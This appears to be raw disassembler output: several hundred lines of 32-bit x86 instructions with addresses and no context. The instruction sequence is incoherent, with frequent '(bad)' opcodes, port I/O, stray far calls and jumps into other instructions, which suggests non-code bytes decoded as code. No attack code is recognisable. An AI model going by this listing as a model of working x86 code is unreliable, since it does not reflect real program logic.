  40beca:	mov    bl,0x3d
  40becc:	inc    esp
  40becd:	adc    ebx,DWORD PTR [ebp-0x1fe93580]
  40bed3:	jae    0x40be82
  40bed5:	push   0x8ef29b6f
  40beda:	push   cs
  40bedb:	pop    ss
  40bedc:	je     0x40be8f
  40bede:	mov    cl,0xe2
  40bee0:	inc    edx
  40bee1:	std    
  40bee2:	dec    esi
  40bee3:	rol    al,cl
  40bee5:	push   0x52b4b2ef
  40beea:	fadd   st,st(1)
  40beec:	sub    eax,0x7ae8ae2f
  40bef1:	out    0x70,al
  40bef3:	cmp    BYTE PTR [ecx+0x494288b6],al
  40bef9:	mov    al,0x9c
  40befb:	hlt    
  40befc:	in     al,dx
  40befd:	fimul  DWORD PTR [eax-0x7d05ea82]
  40bf03:	pop    edx
  40bf04:	xor    ah,ch
  40bf06:	out    0x1a,eax
  40bf08:	imul   ecx,DWORD PTR ds:0x725bf24a,0xa5681cab
  40bf12:	popa   
  40bf13:	or     ah,BYTE PTR [edi]
  40bf15:	dec    ebp
  40bf16:	xchg   ecx,eax
  40bf17:	jbe    0x40bf27
  40bf19:	xor    BYTE PTR [ebx+0x1],al
  40bf1c:	mov    ds:0x4125f6d6,al
  40bf21:	cmp    bh,BYTE PTR [eax-0xa]
  40bf24:	das    
  40bf25:	cmp    eax,0xa9592000
  40bf2a:	das    
  40bf2b:	sub    al,0xb2
  40bf2d:	arpl   WORD PTR ds:0xb1ab83a5,di
  40bf33:	push   edi
  40bf34:	xchg   edx,eax
  40bf35:	fisttp WORD PTR [ecx+0x42]
  40bf38:	adc    BYTE PTR [esp+edx*1-0x61],bh
  40bf3c:	sub    edi,eax
  40bf3e:	fldcw  WORD PTR [edx+0xd6d1aa5]
  40bf44:	fcom   QWORD PTR [eax+0x28]
  40bf47:	shl    edx,1
  40bf49:	cli    
  40bf4a:	sbb    al,0xf7
  40bf4c:	mov    bh,0x8
  40bf4e:	add    bh,ch
  40bf50:	jns    0x40bf0b
  40bf52:	js     0x40bf3e
  40bf54:	sti    
  40bf55:	cli    
  40bf56:	mov    BYTE PTR [edi],ah
  40bf58:	and    BYTE PTR [ebx-0x7a],al
  40bf5b:	shl    DWORD PTR [esi-0x193011a4],cl
  40bf61:	fcom   DWORD PTR [ebx]
  40bf63:	in     al,0x8d
  40bf65:	leave  
  40bf66:	shr    BYTE PTR [edx],cl
  40bf68:	fidiv  DWORD PTR [edx+0x79035f7]
  40bf6e:	arpl   WORD PTR [ebx+0x574e57eb],dx
  40bf74:	cld    
  40bf75:	sub    BYTE PTR [edi],0x3
  40bf78:	popf   
  40bf79:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bf7a:	lea    edx,[ebx-0x2f3d2754]
  40bf80:	aas    
  40bf81:	das    
  40bf82:	push   esp
  40bf83:	adc    BYTE PTR [edx+0x42],cl
  40bf86:	jo     0x40bfc2
  40bf88:	aas    
  40bf89:	jge    0x40bf79
  40bf8b:	jo     0x40bf1e
  40bf8d:	imul   ecx,DWORD PTR [eax+0x72],0xffffff8b
  40bf91:	push   ebx
  40bf92:	xor    al,0xd6
  40bf94:	loope  0x40bf16
  40bf96:	fstp   DWORD PTR [edx+0x3075a397]
  40bf9c:	mov    BYTE PTR [edi-0x6f],al
  40bf9f:	call   0xbf58:0xafeba57e
  40bfa6:	(bad)  
  40bfa7:	fisubr WORD PTR [esi-0x51]
  40bfaa:	pop    esi
  40bfab:	mov    ebx,0x7791ff42
  40bfb0:	fnstsw WORD PTR [ecx+0x33]
  40bfb3:	jne    0x40bf6f
  40bfb5:	jne    0x40bffb
  40bfb7:	jmp    0x40bf7d
  40bfb9:	ret    
  40bfba:	add    eax,0xf4ccd7e6
  40bfbf:	imul   eax,ebp,0x48
  40bfc2:	push   ebx
  40bfc3:	iret   
  40bfc4:	cmp    eax,0xee740e1f
  40bfc9:	xor    edi,esi
  40bfcb:	test   BYTE PTR [edi+0x1e],dh
  40bfce:	and    DWORD PTR [edx-0x471c5ab3],esi
  40bfd4:	inc    edx
  40bfd5:	inc    edx
  40bfd6:	outs   dx,BYTE PTR ds:[esi]
  40bfd7:	lock outs dx,DWORD PTR ds:[esi]
  40bfd9:	rcl    DWORD PTR [ebx],cl
  40bfdb:	mov    ds:0x996ae826,al
  40bfe0:	repnz sbb DWORD PTR [ecx+0x69],edx
  40bfe4:	adc    BYTE PTR ds:0x6625dfa,ah
  40bfea:	adc    BYTE PTR [eax+0x76bc5a31],0xf3
  40bff1:	scas   eax,DWORD PTR es:[edi]
  40bff2:	xchg   ebx,eax
  40bff3:	mov    ds:0xacfdac3d,eax
  40bff8:	and    al,BYTE PTR [esi]
  40bffa:	lods   eax,DWORD PTR ds:[esi]
  40bffb:	pop    eax
  40bffc:	ret    
  40bffd:	sti    
  40bffe:	pop    ebx
  40bfff:	(bad)  
  40c000:	xlat   BYTE PTR ds:[ebx]
  40c001:	xchg   bl,al
  40c003:	jns    0x40bf8e
  40c005:	das    
  40c006:	icebp  
  40c007:	xchg   edi,eax
  40c008:	lea    ecx,[edx]
  40c00a:	push   edx
  40c00b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c00c:	mov    eax,0x43056f68
  40c011:	sbb    al,0x9a
  40c013:	xchg   esp,eax
  40c014:	leave  
  40c015:	into   
  40c016:	lahf   
  40c017:	add    cl,BYTE PTR [edx+ebp*2+0x6cbfdc69]
  40c01e:	cmp    BYTE PTR cs:[ecx],cl
  40c021:	fdiv   QWORD PTR [ecx]
  40c023:	outs   dx,BYTE PTR ds:[esi]
  40c024:	ins    BYTE PTR es:[edi],dx
  40c025:	ins    BYTE PTR es:[edi],dx
  40c026:	jns    0x40c095
  40c028:	retf   
  40c029:	xor    edx,edx
  40c02b:	or     cl,BYTE PTR [edi+0x103426d9]
  40c031:	repnz inc ebp
  40c033:	shr    BYTE PTR [ebx+eiz*4+0x61cfb33c],1
  40c03a:	pop    ds
  40c03b:	ins    BYTE PTR es:[edi],dx
  40c03c:	into   
  40c03d:	or     eax,0x272f2dbb
  40c042:	popa   
  40c043:	(bad)  
  40c044:	jo     0x40c01a
  40c046:	add    BYTE PTR ds:0xec92596a,al
  40c04c:	push   ds
  40c04d:	dec    ebx
  40c04e:	in     al,dx
  40c04f:	lods   eax,DWORD PTR ds:[esi]
  40c050:	dec    edi
  40c051:	imul   DWORD PTR [edi]
  40c053:	aas    
  40c054:	jle    0x40c08d
  40c056:	and    dl,BYTE PTR [edx+0x46]
  40c059:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c05a:	inc    edx
  40c05b:	(bad)  
  40c05c:	cld    
  40c05d:	fiadd  DWORD PTR [edx+0x5dcd20de]
  40c063:	clc    
  40c064:	ja     0x40c0c4
  40c066:	iret   
  40c067:	dec    esi
  40c068:	sbb    al,ch
  40c06a:	mov    WORD PTR [eax+0x28],ds
  40c06d:	inc    ecx
  40c06e:	leave  
  40c06f:	xor    dl,BYTE PTR [esi-0x54faf7bb]
  40c075:	enter  0x3fc0,0xe2
  40c079:	jb     0x40c0c6
  40c07b:	cmp    al,0x5b
  40c07d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c07e:	xor    eax,0x8b9db608
  40c083:	sbb    edx,DWORD PTR [eax+0x17]
  40c086:	aad    0x18
  40c088:	xchg   ebp,eax
  40c089:	or     eax,0x78d5aba4
  40c08e:	call   0x35e8e5b7
  40c093:	inc    edx
  40c094:	dec    ebx
  40c095:	sbb    eax,0x4b0b7219
  40c09a:	and    dh,0xdf
  40c09d:	and    dh,0x75
  40c0a0:	fucom  st(3)
  40c0a2:	adc    BYTE PTR [ebp+0x74],dh
  40c0a5:	test   eax,0x92939c31
  40c0aa:	sar    DWORD PTR [ebx+edx*4-0xb],cl
  40c0ae:	test   BYTE PTR [ecx+ecx*4],al
  40c0b1:	pusha  
  40c0b2:	jg     0x40c04a
  40c0b4:	jnp    0x40c046
  40c0b6:	and    al,0x47
  40c0b8:	mov    cl,0xb2
  40c0ba:	int3   
  40c0bb:	mov    esi,0x175d8b85
  40c0c0:	inc    esi
  40c0c1:	out    dx,al
  40c0c2:	sub    BYTE PTR [ebx+0x480b6e7e],al
  40c0c8:	xchg   esi,eax
  40c0c9:	dec    edi
  40c0ca:	mov    eax,ds:0x59df5f67
  40c0cf:	inc    esp
  40c0d0:	(bad)  
  40c0d1:	fistp  QWORD PTR [edi+0x5b]
  40c0d4:	pop    ss
  40c0d5:	(bad)  {k3}
  40c0da:	cmp    DWORD PTR [edi-0x5a],0xf
  40c0de:	mov    eax,0x1ed64b32
  40c0e3:	rol    BYTE PTR ds:0xd6876791,0x49
  40c0ea:	mov    DWORD PTR [esi+0x38],ebp
  40c0ed:	loopne 0x40c0be
  40c0ef:	out    dx,eax
  40c0f0:	pop    esi
  40c0f1:	xor    BYTE PTR [ebx+0x2a],ch
  40c0f4:	add    BYTE PTR [ebx+eax*4-0x281b3c18],ah
  40c0fb:	inc    esp
  40c0fc:	push   ecx
  40c0fd:	xor    eax,0x5636d9f
  40c102:	xchg   edi,eax
  40c103:	in     eax,0xe
  40c105:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c106:	std    
  40c107:	mov    DWORD PTR [esi],eax
  40c109:	sbb    ebp,edx
  40c10b:	xchg   ebp,eax
  40c10c:	push   ss
  40c10d:	jl     0x40c099
  40c10f:	xor    al,0xae
  40c111:	imul   eax,DWORD PTR [edx-0x3f],0x1
  40c115:	jecxz  0x40c0d9
  40c117:	xchg   ebp,eax
  40c118:	dec    edi
  40c119:	xchg   ebx,eax
  40c11a:	pop    ecx
  40c11b:	mov    eax,ebp
  40c11d:	sbb    DWORD PTR [esi+0x2cd14b7e],eax
  40c123:	retf   0x623f
  40c126:	dec    ecx
  40c127:	test   ebx,edi
  40c129:	and    DWORD PTR [ebp-0x395d5c44],edx
  40c12f:	ds cs adc edi,edx
  40c133:	imul   eax,esi,0x69
  40c136:	push   ecx
  40c137:	ficomp WORD PTR [ebp-0x549d5410]
  40c13d:	mov    ecx,eax
  40c13f:	out    0xd8,al
  40c141:	sub    cl,ch
  40c143:	sbb    eax,0xac5a217f
  40c148:	mov    ds:0xb536a937,al
  40c14d:	lahf   
  40c14e:	adc    BYTE PTR ds:0x1c29c84c,0x2
  40c155:	jmp    0xc0c58250
  40c15a:	icebp  
  40c15b:	aam    0xca
  40c15d:	fyl2x  
  40c15f:	jl     0x40c145
  40c161:	and    DWORD PTR [edi],edx
  40c163:	mov    ecx,0xd63bea15
  40c168:	mov    esi,0x42563617
  40c16d:	repnz pusha 
  40c16f:	dec    ecx
  40c170:	shr    DWORD PTR [esi],cl
  40c172:	dec    ebx
  40c173:	pop    esi
  40c174:	aas    
  40c175:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c176:	sub    BYTE PTR [edi+0x18d3d2ea],al
  40c17c:	addr16 adc eax,0x90984e00
  40c182:	shl    BYTE PTR [esi-0x25a690c9],cl
  40c188:	loope  0x40c1bc
  40c18a:	outs   dx,DWORD PTR ds:[esi]
  40c18b:	add    eax,0x884a1c7d
  40c190:	mov    eax,0x713cf8cc
  40c195:	inc    esp
  40c196:	jbe    0x40c1f7
  40c198:	adc    DWORD PTR [esi+esi*2-0x6d91cd1],edi
  40c19f:	(bad)  
  40c1a0:	ds js  0x40c197
  40c1a3:	ret    0x88f3
  40c1a6:	mov    eax,cs:0x8d6c3037
  40c1ac:	adc    eax,0xd4465c1d
  40c1b1:	iret   
  40c1b2:	out    0x7d,al
  40c1b4:	fld    QWORD PTR [ebp+eax*8+0x20794683]
  40c1bb:	nop
  40c1bc:	mov    dl,0xc
  40c1be:	xor    DWORD PTR [ebx+0x2e],edx
  40c1c1:	(bad)  
  40c1c2:	fstp   TBYTE PTR [ebp-0x143d6e78]
  40c1c8:	inc    ecx
  40c1c9:	(bad)  
  40c1ca:	enter  0xb576,0x69
  40c1ce:	imul   ebp,esi,0x8d71c13b
  40c1d4:	aam    0x98
  40c1d6:	jns    0x40c1da
  40c1d8:	out    dx,al
  40c1d9:	pop    edx
  40c1da:	mov    ecx,?
  40c1dc:	in     al,dx
  40c1dd:	jns    0x40c21d
  40c1df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c1e0:	mov    cl,0xcb
  40c1e2:	adc    al,BYTE PTR [ebx]
  40c1e4:	and    al,0x3b
  40c1e6:	sbb    eax,0x8a5577f8
  40c1eb:	idiv   BYTE PTR [edi+0x6a]
  40c1ee:	mov    ebp,0x791fd62b
  40c1f3:	cmp    esi,DWORD PTR [ecx+eax*1]
  40c1f6:	pushf  
  40c1f7:	or     BYTE PTR [edi+0x75431632],bh
  40c1fd:	fldenv [ecx-0x20]
  40c200:	dec    eax
  40c201:	mov    al,ds:0x2109d8ee
  40c206:	js     0x40c1dc
  40c208:	pop    ebp
  40c209:	into   
  40c20a:	pop    ds
  40c20b:	sar    ebp,1
  40c20d:	adc    edi,DWORD PTR [eax-0x30]
  40c210:	hlt    
  40c211:	call   DWORD PTR [ecx]
  40c213:	pop    ebp
  40c214:	push   0xad1994b2
  40c219:	inc    eax
  40c21a:	hlt    
  40c21b:	retf   0x7570
  40c21e:	test   bl,bh
  40c220:	ss mov ecx,0x5d549cd0
  40c226:	sub    al,BYTE PTR [esi]
  40c228:	jmp    0x170f:0xecb1b17
  40c22f:	pushf  
  40c230:	push   cs
  40c231:	cwde   
  40c232:	outs   dx,DWORD PTR ds:[esi]
  40c233:	popf   
  40c234:	lods   al,BYTE PTR ds:[esi]
  40c235:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c236:	jne    0x40c28e
  40c238:	mov    al,0xea
  40c23a:	pop    ecx
  40c23b:	mov    ah,0x3a
  40c23d:	mov    esi,0x96f9c213
  40c242:	pop    edi
  40c243:	daa    
  40c244:	fsub   DWORD PTR [eax-0x5be6e0d7]
  40c24a:	add    dh,BYTE PTR [eax+0x63e81e88]
  40c250:	hlt    
  40c251:	std    
  40c252:	push   ebx
  40c253:	add    eax,0x22f1b68d
  40c258:	pop    ds
  40c259:	loope  0x40c29b
  40c25b:	aaa    
  40c25c:	test   dl,al
  40c25e:	call   0xa35a:0x9aad850c
  40c265:	inc    edi
  40c266:	test   DWORD PTR [edx+0x54],ebp
  40c269:	outs   dx,DWORD PTR ds:[esi]
  40c26a:	jne    0x40c282
  40c26c:	cmp    BYTE PTR ds:0xb7c03512,0x8b
  40c273:	cmc    
  40c274:	test   BYTE PTR [ebx],ch
  40c276:	aas    
  40c277:	shl    BYTE PTR [eax+eiz*8-0x67e0dbcf],0x8d
  40c27f:	and    al,0xac
  40c281:	ret    0xe93f
  40c284:	addr16 jno 0x40c27c
  40c287:	xchg   ebx,esi
  40c289:	out    dx,al
  40c28a:	out    0x6,eax
  40c28c:	push   esi
  40c28d:	mov    ecx,DWORD PTR [edx-0x30]
  40c290:	aam    0xc9
  40c292:	jae    0x40c252
  40c294:	ret    
  40c295:	fisttp DWORD PTR [ebx-0x70]
  40c298:	les    esp,FWORD PTR [edi-0x3b]
  40c29b:	sub    BYTE PTR ds:0x4bd2bfe5,0xe0
  40c2a2:	pop    ds
  40c2a3:	(bad)  
  40c2a5:	sbb    edx,DWORD PTR [esi]
  40c2a7:	test   eax,0xd13966ef
  40c2ac:	in     al,dx
  40c2ad:	pop    ss
  40c2ae:	jg     0x40c288
  40c2b0:	and    BYTE PTR fs:[eax],dl
  40c2b3:	rcr    cl,cl
  40c2b5:	out    0xb1,eax
  40c2b7:	cmp    BYTE PTR [edx+ebp*2-0x77b50a84],ch
  40c2be:	sub    DWORD PTR [ebx-0x3e],ebp
  40c2c1:	push   ss
  40c2c2:	nop
  40c2c3:	add    DWORD PTR [edx],esi
  40c2c5:	(bad)  [edx+0x6c]
  40c2c8:	loope  0x40c338
  40c2ca:	ds ja  0x40c2fa
  40c2cd:	push   ds
  40c2ce:	xchg   edi,eax
  40c2cf:	xchg   esi,eax
  40c2d0:	pop    ebp
  40c2d1:	push   esp
  40c2d2:	clc    
  40c2d3:	inc    edx
  40c2d4:	jbe    0x40c26f
  40c2d6:	and    DWORD PTR ds:0xc0fe9fe1,0xffffffd6
  40c2dd:	push   ds
  40c2de:	adc    esp,DWORD PTR [ecx+0x53]
  40c2e1:	push   ebx
  40c2e2:	icebp  
  40c2e3:	shl    DWORD PTR [ebp+0x56],1
  40c2e6:	push   es
  40c2e7:	mov    edi,0xd2ccec28
  40c2ec:	add    bl,BYTE PTR [esi]
  40c2ee:	sub    eax,0x51ce9ad0
  40c2f3:	test   BYTE PTR [ebx+0x16482d62],al
  40c2f9:	fimul  WORD PTR [ecx-0x25ce9ec0]
  40c2ff:	xchg   DWORD PTR [edi+0x1bc085f1],ecx
  40c305:	xchg   edi,eax
  40c306:	int    0x69
  40c308:	fneni(8087 only) 
  40c30a:	rcl    DWORD PTR [eax],1
  40c30c:	xor    al,0xb0
  40c30e:	inc    ecx
  40c30f:	mov    esi,0x6d0e566e
  40c314:	ss int 0x4a
  40c317:	lahf   
  40c318:	mov    esp,0xc9330ec5
  40c31d:	daa    
  40c31e:	jae    0x40c2b2
  40c320:	sub    dl,BYTE PTR [edi+eax*4-0x3]
  40c324:	and    DWORD PTR [edx],ecx
  40c326:	(bad)
  40c329:	push   esi
  40c32a:	(bad)  
  40c32b:	popa   
  40c32c:	inc    ebp
  40c32d:	add    ecx,DWORD PTR [ebx-0x79]
  40c330:	jmp    0xd0d9d7f6
  40c335:	popa   
  40c336:	pushf  
  40c337:	mov    al,0x1e
  40c339:	outs   dx,DWORD PTR fs:[esi]
  40c33b:	inc    ah
  40c33d:	mov    eax,ds:0x4eea56c8
  40c342:	mov    dl,0x8d
  40c344:	mov    edi,0x219a6450
  40c349:	push   0x78
  40c34b:	sub    eax,0x29d9fc37
  40c350:	pop    edx
  40c351:	xchg   esi,eax
  40c352:	data16 mov ah,0x35
  40c355:	lock scas al,BYTE PTR es:[edi]
  40c357:	push   edi
  40c358:	icebp  
  40c359:	dec    esp
  40c35a:	pop    ebx
  40c35b:	popf   
  40c35c:	mov    esi,esi
  40c35e:	scas   eax,DWORD PTR es:[edi]
  40c35f:	call   0x537c:0x66da0415
  40c366:	mov    esp,0x91d73dd6
  40c36b:	icebp  
  40c36c:	and    ah,BYTE PTR [edi+0x14c8d0f0]
  40c372:	ja     0x40c38c
  40c374:	inc    ecx
  40c375:	rcr    BYTE PTR ds:0xfc582775,0x25
  40c37c:	cdq    
  40c37d:	or     al,0xb1
  40c37f:	mov    ecx,0x8476284a
  40c384:	pop    ecx
  40c385:	jno    0x40c402
  40c387:	xchg   BYTE PTR [ecx],ch
  40c389:	mov    ds:0xa52cb2ee,al
  40c38e:	pop    ds
  40c38f:	xor    eax,0x32d91c92
  40c394:	xchg   esp,eax
  40c395:	mov    ds:0x3590df4e,al
  40c39a:	push   edi
  40c39b:	mov    dh,0x21
  40c39d:	retf   0xc440
  40c3a0:	xchg   ebx,eax
  40c3a1:	sub    DWORD PTR [eax-0x26],edi
  40c3a4:	fidivr WORD PTR [edx]
  40c3a6:	inc    ebp
  40c3a7:	mov    ?,WORD PTR [ecx]
  40c3a9:	jno    0x40c346
  40c3ab:	imul   esi,eax,0x55
  40c3ae:	loop   0x40c398
  40c3b0:	repz add esi,esi
  40c3b3:	inc    eax
  40c3b4:	test   eax,0x3b62510f
  40c3b9:	loope  0x40c361
  40c3bb:	aad    0x34
  40c3bd:	push   edi
  40c3be:	aas    
  40c3bf:	xor    esi,edx
  40c3c1:	mov    cl,0x25
  40c3c3:	iret   
  40c3c4:	mov    dl,0x40
  40c3c6:	rol    esp,1
  40c3c8:	std    
  40c3c9:	jmp    0x40c3a1
  40c3cb:	inc    esi
  40c3cc:	xor    edx,0xb48ed233
  40c3d2:	mov    ecx,0x57c1b1ac
  40c3d7:	adc    edx,DWORD PTR [edi]
  40c3d9:	mov    esp,0xce98b0c
  40c3de:	xor    eax,0x21810e23
  40c3e3:	into   
  40c3e4:	out    0x39,eax
  40c3e6:	mov    ds:0x159eee54,eax
  40c3eb:	shl    BYTE PTR [ebx+0x66a33070],1
  40c3f1:	add    al,0x5
  40c3f3:	lds    esp,FWORD PTR [esi+0x246afc70]
  40c3f9:	neg    DWORD PTR [ecx-0x67]
  40c3fc:	inc    esi
  40c3fd:	mov    ah,0x18
  40c3ff:	bound  ebp,QWORD PTR [ecx-0x20c1a58f]
  40c405:	dec    esi
  40c406:	lock fdivr st,st(3)
  40c409:	pop    ds
  40c40a:	xlat   BYTE PTR ds:[ebx]
  40c40b:	mov    ds:0xff6d2967,eax
  40c410:	inc    al
  40c412:	sub    BYTE PTR [eax+0x75],0x6b
  40c416:	dec    eax
  40c417:	pop    ecx
  40c418:	stc    
  40c419:	aas    
  40c41a:	movmskps esp,xmm0
  40c41d:	mov    edi,esp
  40c41f:	test   ch,0x39
  40c422:	test   eax,0xd20a7482
  40c427:	mov    cl,bl
  40c429:	mov    al,0xac
  40c42b:	cdq    
  40c42c:	popa   
  40c42d:	mov    dh,BYTE PTR [esi]
  40c42f:	test   BYTE PTR [ecx],bl
  40c431:	div    DWORD PTR [ebx+ebp*4-0x5f]
  40c435:	imul   edi,DWORD PTR [ebx-0x13b4fc7],0xcc8d16db
  40c43f:	(bad)  
  40c440:	cmp    dl,ah
  40c442:	pop    esi
  40c443:	push   ds
  40c444:	or     al,0xcb
  40c446:	nop
  40c447:	inc    ecx
  40c448:	sub    eax,0x19af8f96
  40c44d:	test   DWORD PTR [edi+0x2c],eax
  40c450:	fisubr WORD PTR [ebx+0x743166a3]
  40c456:	in     al,dx
  40c457:	inc    edi
  40c458:	jb     0x40c45c
  40c45a:	iret   
  40c45b:	and    al,0xe5
  40c45d:	push   ebx
  40c45e:	jo     0x40c4c7
  40c460:	mov    esi,0x12d853b
  40c465:	push   ds
  40c466:	mov    al,0x76
  40c468:	fist   DWORD PTR [ecx+0x40]
  40c46b:	lds    ebx,FWORD PTR [edx-0x17]
  40c46e:	pushfw 
  40c470:	inc    ebp
  40c471:	(bad)  
  40c472:	out    0xe1,al
  40c474:	(bad)  
  40c476:	add    al,0x12
  40c478:	mov    esi,0x58239be
  40c47d:	and    eax,0x1f0b3571
  40c482:	cmc    
  40c483:	rcl    DWORD PTR [esi+0x2c465774],cl
  40c489:	arpl   WORD PTR [ecx+0x709d36c2],di
  40c48f:	sbb    al,0xbe
  40c491:	aam    0xc2
  40c493:	test   al,0x54
  40c495:	hlt    
  40c496:	xor    DWORD PTR [eax],ecx
  40c498:	sti    
  40c499:	adc    al,0xb5
  40c49b:	jo     0x40c474
  40c49d:	loopne 0x40c51c
  40c49f:	mov    eax,0xc9a266be
  40c4a4:	lds    ecx,FWORD PTR [ecx-0x75]
  40c4a7:	lods   al,BYTE PTR ds:[esi]
  40c4a8:	and    al,0xb4
  40c4aa:	pop    ebx
  40c4ab:	stos   BYTE PTR es:[edi],al
  40c4ac:	repnz cmp BYTE PTR [ebp-0x16],bl
  40c4b0:	mov    dl,0xdb
  40c4b2:	mov    ah,0xbb
  40c4b4:	stc    
  40c4b5:	cmp    eax,0x96f538f3
  40c4bb:	adc    DWORD PTR [edx+0x2e],ecx
  40c4be:	enter  0x2576,0xaf
  40c4c2:	test   DWORD PTR [esi],ecx
  40c4c4:	test   bl,0x9c
  40c4c7:	(bad)  
  40c4c9:	mov    DWORD PTR [ecx+0x53],eax
  40c4cc:	jge    0x40c4b9
  40c4ce:	mov    edx,0xf13a7c7d
  40c4d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c4d4:	(bad)  
  40c4d5:	repnz xor eax,0x50fbcce8
  40c4db:	dec    edi
  40c4dc:	dec    esp
  40c4dd:	mov    edx,0x73a4a01d
  40c4e2:	ret    0xf6f6
  40c4e5:	ret    0x10dc
  40c4e8:	lods   eax,DWORD PTR cs:[esi]
  40c4ea:	int    0x37
  40c4ec:	add    al,0xc0
  40c4ee:	add    eax,0x12f993ac
  40c4f3:	(bad)  
  40c4f4:	or     ebp,edi
  40c4f6:	out    0xd,eax
  40c4f8:	add    BYTE PTR [esi],al
  40c4fa:	mov    cl,0xa5
  40c4fc:	frstor [esi+0x4d1a7190]
  40c502:	fcom   QWORD PTR [edx-0x7d]
  40c505:	pop    ebx
  40c506:	iret   
  40c507:	push   ebx
  40c508:	xchg   ecx,eax
  40c509:	add    BYTE PTR [ebx+0x6cb436c0],dl
  40c50f:	mov    ds:0xeea20eac,al
  40c514:	dec    ecx
  40c515:	inc    ebx
  40c516:	pop    edx
  40c517:	rcr    esi,cl
  40c519:	int3   
  40c51a:	push   ebx
  40c51b:	(bad)  
  40c51c:	jmp    DWORD PTR [edx-0x2b20687c]
  40c522:	jbe    0x40c4c2
  40c524:	popa   
  40c525:	mov    eax,ds:0x9a5197b0
  40c52a:	xchg   bh,bl
  40c52c:	data16 jmp 0x40c549
  40c52f:	push   0xd1c37da2
  40c534:	stc    
  40c535:	or     DWORD PTR [edx-0x12137e33],ecx
  40c53b:	xchg   DWORD PTR [eax],edx
  40c53d:	das    
  40c53e:	mov    edi,eax
  40c540:	push   ebp
  40c541:	cli    
  40c542:	jmp    0x40c5bf
  40c544:	lock nop
  40c546:	out    dx,eax
  40c547:	aam    0x17
  40c549:	xchg   esi,eax
  40c54a:	out    dx,eax
  40c54b:	ja     0x40c5b0
  40c54d:	loop   0x40c5aa
  40c54f:	add    al,0x78
  40c551:	sar    DWORD PTR [edi+ebp*2],cl
  40c554:	push   ds
  40c555:	jae    0x40c4d9
  40c557:	mov    esp,0xfad171b1
  40c55c:	push   esi
  40c55d:	imul   eax,DWORD PTR [ebx-0x2c],0xffffffa8
  40c561:	xor    DWORD PTR ds:0x6098cfb8,edx
  40c567:	add    eax,edx
  40c569:	scas   eax,DWORD PTR es:[edi]
  40c56a:	adc    al,0x62
  40c56c:	je     0x40c5a6
  40c56e:	sub    DWORD PTR [eax+0x75202ca2],0xffffffba
  40c575:	pop    ss
  40c576:	sub    al,0xe4
  40c578:	aas    
  40c579:	xor    BYTE PTR [ecx],dh
  40c57b:	mov    ah,0xbf
  40c57d:	js     0x40c5f4
  40c57f:	aad    0x59
  40c581:	fisubr DWORD PTR [edi+0x3e]
  40c584:	mov    ah,0xb4
  40c586:	sbb    DWORD PTR [ecx-0x35e83589],ebp
  40c58c:	add    ebp,DWORD PTR [ebp-0x3ec01c5b]
  40c592:	push   ebp
  40c593:	jg     0x40c600
  40c595:	jl     0x40c558
  40c597:	add    BYTE PTR [eax+0x6a],ch
  40c59a:	dec    esp
  40c59b:	aam    0x91
  40c59d:	xchg   ebx,eax
  40c59e:	(bad)
  40c5a2:	addr16 mov ah,0xe1
  40c5a5:	outs   dx,BYTE PTR ds:[esi]
  40c5a6:	mov    es,WORD PTR [edx+eiz*4]
  40c5a9:	jmp    0x26031849
  40c5ae:	shl    ebp,cl
  40c5b0:	sbb    al,0x77
  40c5b2:	js     0x40c537
  40c5b4:	add    BYTE PTR [ebx],bh
  40c5b6:	bound  ecx,QWORD PTR [ebx-0x673a99c4]
  40c5bc:	sbb    ebp,eax
  40c5be:	jne    0x40c5bb
  40c5c0:	shl    BYTE PTR [ebx+0x56451aa7],0x27
  40c5c7:	ins    BYTE PTR es:[edi],dx
  40c5c8:	jbe    0x40c5fc
  40c5ca:	inc    si
  40c5cc:	pop    esi
  40c5cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c5ce:	call   0xe0e6:0xe33a9e64
  40c5d5:	and    eax,0x813b8fa4
  40c5da:	inc    esp
  40c5db:	cmp    eax,0x6fc4db7d
  40c5e0:	ret    0xd8df
  40c5e3:	arpl   WORD PTR [esi],sp
  40c5e5:	pop    esi
  40c5e6:	aad    0x67
  40c5e8:	push   cs
  40c5e9:	loop   0x40c655
  40c5eb:	adc    eax,edx
  40c5ed:	inc    edx
  40c5ee:	adc    ebx,eax
  40c5f0:	pop    ebp
  40c5f1:	xor    ebp,eax
  40c5f3:	mov    edi,0xec4b8367
  40c5f8:	test   al,0xe4
  40c5fa:	enter  0xc3fd,0x43
  40c5fe:	(bad)  
  40c600:	sahf   
  40c601:	jbe    0x40c5f6
  40c603:	dec    esp
  40c604:	pop    ebx
  40c605:	bound  eax,QWORD PTR [ecx]
  40c607:	push   ebx
  40c608:	rcl    DWORD PTR [esi-0x5298bd59],0xf8
  40c60f:	pop    es
  40c610:	add    ah,ah
  40c612:	add    al,0xd
  40c614:	cmp    esi,DWORD PTR [ecx+0x2b6cc47f]
  40c61a:	dec    edx
  40c61b:	fild   DWORD PTR [ebp+eiz*2+0xbb5877e]
  40c622:	out    0x99,al
  40c624:	push   eax
  40c625:	jmp    0x40c5ba
  40c627:	pop    es
  40c628:	sahf   
  40c629:	push   ss
  40c62a:	call   0x4dae:0xaf70d975
  40c631:	leave  
  40c632:	or     BYTE PTR [esi-0x79],0x1d
  40c636:	loop   0x40c66e
  40c638:	idiv   BYTE PTR [ecx+0x7bb9887f]
  40c63e:	push   0xd6cd22d6
  40c643:	bound  ebx,QWORD PTR [ecx+0x5c]
  40c646:	dec    ebp
  40c647:	sar    BYTE PTR [edx+0x6443efe0],0x49
  40c64e:	daa    
  40c64f:	jmp    0xb986cd01
  40c654:	ds test eax,esi
  40c657:	xchg   edi,eax
  40c658:	cwde   
  40c659:	pop    edi
  40c65a:	outs   dx,DWORD PTR ds:[esi]
  40c65b:	cld    
  40c65c:	data16 sbb al,0x7c
  40c65f:	test   al,0xef
  40c661:	ss sub eax,0x1d134867
  40c667:	add    ch,dh
  40c669:	mov    ah,BYTE PTR [ecx]
  40c66b:	sub    DWORD PTR [edi+0x4c800fcb],ecx
  40c671:	(bad)  
  40c672:	dec    ecx
  40c673:	(bad)  
  40c674:	push   ecx
